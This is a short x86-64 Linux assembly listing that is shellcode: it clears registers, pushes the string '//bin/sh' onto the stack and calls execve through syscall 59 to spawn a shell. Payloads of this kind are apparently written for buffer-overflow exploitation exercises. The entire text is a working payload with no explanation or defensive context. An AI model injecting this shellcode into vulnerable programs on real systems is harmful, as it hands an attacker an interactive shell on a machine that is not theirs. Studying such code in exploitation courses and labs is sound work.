section .text
global _start

_start:
	xor rax, rax
	mov rdx, rax ; NULL for argument # 3
	mov rsi, rax ; NULL for argument # 2

	push rax
	mov rbx, 0x68732f6e69622f2f ; //bin/sh\0 
	push rbx
	mov rdi, rsp

	add rax, 59
	syscall

